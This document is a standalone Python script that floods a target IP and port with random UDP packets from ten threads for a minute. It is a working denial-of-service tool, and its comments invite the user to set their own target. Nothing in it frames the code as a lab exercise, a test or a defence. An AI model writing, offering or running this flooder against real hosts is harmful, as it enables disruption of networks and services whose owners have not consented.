import socket
import random
import threading
import time

# Target information
TARGET_IP = "192.168.0.174"  # Replace with your target IP
TARGET_PORT = 80             # Replace with your target port (e.g., 80 for HTTP)

# Packet flooder function
def flood_target():
    # Create a raw socket
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP socket
    except Exception as e:
        print(f"Socket creation failed: {e}")
        return

    # Infinite loop to send packets
    while True:
        try:
            # Randomize packet data
            packet_data = random._urandom(1024)  # Random 1 KB data
            
            # Send packet
            sock.sendto(packet_data, (TARGET_IP, TARGET_PORT))
            print(f"Sent packet to {TARGET_IP}:{TARGET_PORT}")
        except Exception as e:
            print(f"Error sending packet: {e}")
            break

# Launch multiple threads for higher traffic
def start_flood(threads=10):
    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=flood_target)
        thread.daemon = True  # Allows the program to exit even if threads are running
        thread_list.append(thread)
        thread.start()

    # Allow the flood to run for a certain duration
    try:
        time.sleep(60)  # Change the duration as needed
    except KeyboardInterrupt:
        print("\nFlood stopped by user.")

if __name__ == "__main__":
    print("Starting the flood...")
    start_flood(threads=10)
